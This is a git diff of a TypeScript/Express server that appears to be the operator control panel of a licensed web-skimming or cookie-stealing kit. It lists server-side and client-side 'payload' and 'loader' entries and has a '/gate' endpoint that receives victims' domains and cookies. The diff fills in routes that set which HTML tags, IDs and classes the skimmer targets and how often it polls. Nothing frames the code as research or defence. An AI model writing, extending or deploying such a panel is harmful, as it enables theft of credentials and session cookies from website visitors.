@@ -38,7 +38,7 @@ export class App {
                 console.log('[!] License Key:'+this.conf.licenseKey);
                 this.locker.verify(this.conf);
                 if (!this.conf.randomName){
-                  this.salty="Spear";
+                  this.salty=""+this.conf.instanceUser;
                 } else {
                   this.salty= this.loader.randomString();
                 }
@@ -133,6 +133,14 @@ export class App {
                            <td>Website Payload (Server-Side)</td>
                            <td>`+'<xmp>'+this.expose+'</xmp>'+`</td>
                            </tr>
+                           <tr>
+                           <td>CrossBrowser Payload (Client-Side)</td>
+                           <td>`+'asd'+`</td>
+                           </tr>
+                           <tr>
+                           <td>CrossBrowser Loader (Client-Side)</td>
+                           <td>`+'asd'+`</td>
+                           </tr>
                            </table>
                    `);
           res.end();
@@ -215,27 +223,78 @@ export class App {
              res.end();
         });
         app.get('/'+this.conf.licenseKey+'/tags/add/:tagname',(req,res)=>{
-             res.end();
+          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
+          if (content.documenttags.indexOf(req.params.tagname) > -1){
+            res.send(`<h2> HTML Tag Già presente </h2>`);
+          } else {
+            content.documenttags.push(req.params.tagname);
+            res.send(`<h2> HTML Tag Aggiunto </h2>`);
+          }
+          fs.writeFileSync('./config.json', JSON.stringify(content));
+          res.end();
         });
         app.get('/'+this.conf.licenseKey+'/tags/remove/:tagname',(req,res)=>{
-             res.end();
+          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
+          if (content.documenttags.indexOf(req.params.tagname) > -1) {
+           content.documenttags.splice(content.documenttags.indexOf(req.params.tagname), 1);
+           res.send(`<h2> HTML Tag Rimosso </h2>`);
+         } else {
+           res.send(`<h2> HTML Tag Non presente </h2>`);
+         }
+          fs.writeFileSync('./config.json', JSON.stringify(content));
+          res.end();
         });
-        app.get('/'+this.conf.licenseKey+'/ids/add/:idsname',(req,res)=>{
-             res.end();
+        app.get('/'+this.conf.licenseKey+'/ids/add/:idname',(req,res)=>{
+          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
+          if (content.documentids.indexOf(req.params.idname) > -1){
+            res.send(`<h2> HTML ID Già presente </h2>`);
+          } else {
+            content.documentids.push(req.params.idname);
+            res.send(`<h2> HTML ID Aggiunto </h2>`);
+          }
+          fs.writeFileSync('./config.json', JSON.stringify(content));
+          res.end();
         });
-        app.get('/'+this.conf.licenseKey+'/ids/remove/:idsname',(req,res)=>{
-             res.end();
+        app.get('/'+this.conf.licenseKey+'/ids/remove/:idname',(req,res)=>{
+          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
+          if (content.documentids.indexOf(req.params.idname) > -1) {
+           content.documentids.splice(content.documentids.indexOf(req.params.idname), 1);
+           res.send(`<h2> HTML Id Rimosso </h2>`);
+         } else {
+           res.send(`<h2> HTML Id Non presente </h2>`);
+         }
+          fs.writeFileSync('./config.json', JSON.stringify(content));
+          res.end();
         });
         app.get('/'+this.conf.licenseKey+'/classes/add/:classname',(req,res)=>{
-             res.end();
+          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
+          if (content.documentclasses.indexOf(req.params.classname) > -1){
+            res.send(`<h2> HTML Class Già presente </h2>`);
+          } else {
+            res.send(`<h2> HTML Tag Aggiunto </h2>`);
+            content.documentclasses.push(req.params.classname);
+          }
+          fs.writeFileSync('./config.json', JSON.stringify(content));
+          res.end();
         });
         app.get('/'+this.conf.licenseKey+'/classes/remove/:classname',(req,res)=>{
-             res.end();
+          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
+          if (content.documentclasses.indexOf(req.params.classname) > -1) {
+           content.documentclasses.splice(content.documentclasses.indexOf(req.params.classname), 1);
+           res.send(`<h2> HTML Class Rimosso </h2>`);
+         } else {
+           res.send(`<h2> HTML Class Non presente </h2>`);
+         }
+          fs.writeFileSync('./config.json', JSON.stringify(content));
+          res.end();
         });
         app.get('/'+this.conf.licenseKey+'/polling/modify/:interval',(req,res)=>{
-             res.end();
+            let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
+            content.polling = req.params.interval;
+            fs.writeFileSync('./config.json', JSON.stringify(content));
+            res.send(`<h2> Timer Polling Aggiornato </h2>`);
+            res.end();
         });
-
         app.post('/gate',(req,res)=>{
           if (req.body.domain === null && req.body.cookie === null){
             this.logger.alertMessage(req);
